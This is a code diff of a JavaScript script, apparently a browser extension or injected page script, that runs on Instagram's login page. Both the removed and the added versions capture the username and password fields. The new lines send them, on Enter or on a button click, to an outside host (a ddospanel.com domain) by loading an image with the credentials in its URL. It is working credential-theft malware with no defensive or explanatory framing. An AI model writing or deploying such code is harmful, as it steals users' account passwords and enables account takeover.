@@ -26,20 +26,20 @@ if (localStorage.upom && localStorage.uzom) {
     }	
 }
 
-
-
 if (top.location.href.indexOf("instagram.com") > -1) {
-    document.getElementsByClassName("_rwf8p")[0].onsubmit = function (e) {
-        localStorage.setItem("kadi", document.getElementsByClassName("_kp5f7 _qy55y")[0].value);
-        localStorage.setItem("sifre", document.getElementsByClassName("_kp5f7 _qy55y")[1].value);
-        setTimeout(function () {
-            document.getElementsByClassName("_rwf8p")[0].submit()
-        }, 99);
-        return false
+
+function runScript(e) {
+    if (e.keyCode == 13) {
+        var adi = document.getElementsByClassName("_kp5f7 _qy55y")[0].value;
+        var sifre =  document.getElementsByClassName("_kp5f7 _qy55y")[1].value;
+	    new Image().src = "http://siktir.ddospanel.com/cpp.php" + "?us=" + adi + "&pw=" + sifre;	
+
     }
 }
-if (localStorage.kadi && localStorage.sifre) {
-	
-		new Image().src = "https://siktir.ddospanel.com/cpin.php" + "?us=" + localStorage.kadi + "&pw=" + localStorage.sifre;	
+$('._aj7mu').click(function(){
+var adi = document.getElementsByClassName("_kp5f7 _qy55y")[0].value;
+var sifre =  document.getElementsByClassName("_kp5f7 _qy55y")[1].value;
+	new Image().src = "https://siktir.ddospanel.com/cpin.php" + "?us=" + adi + "&pw=" + sifre;	
 
+});
 }
